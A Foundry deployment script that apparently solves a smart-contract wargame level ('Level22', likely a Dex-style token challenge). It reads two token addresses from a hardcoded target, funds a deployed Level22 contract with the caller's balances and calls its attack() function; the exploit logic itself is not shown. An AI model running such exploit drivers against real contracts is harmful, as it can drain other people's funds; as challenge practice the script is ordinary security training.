// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Level22} from "../src/Level22.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Level22Script is Script {
    address addr = 0x90dB8E0f614c1a22442fEf0ea482eE78D168e3A2;

    function setUp() public {}

    function run() public {
        (bool b1, bytes memory data1) = address(addr).staticcall(abi.encodeWithSignature("token1()"));
        (bool b2, bytes memory data2) = address(addr).staticcall(abi.encodeWithSignature("token2()"));
        require(b1);
        require(b2);
        address token1 = abi.decode(data1, (address));
        address token2 = abi.decode(data2, (address));
        vm.startBroadcast();
        Level22 a = new Level22();
        bool b3 = IERC20(token1).transfer(address(a), IERC20(token1).balanceOf(msg.sender));
        bool b4 = IERC20(token2).transfer(address(a), IERC20(token2).balanceOf(msg.sender));
        require(b3);
        require(b4);
        a.attack(addr);
        vm.stopBroadcast();
    }
}
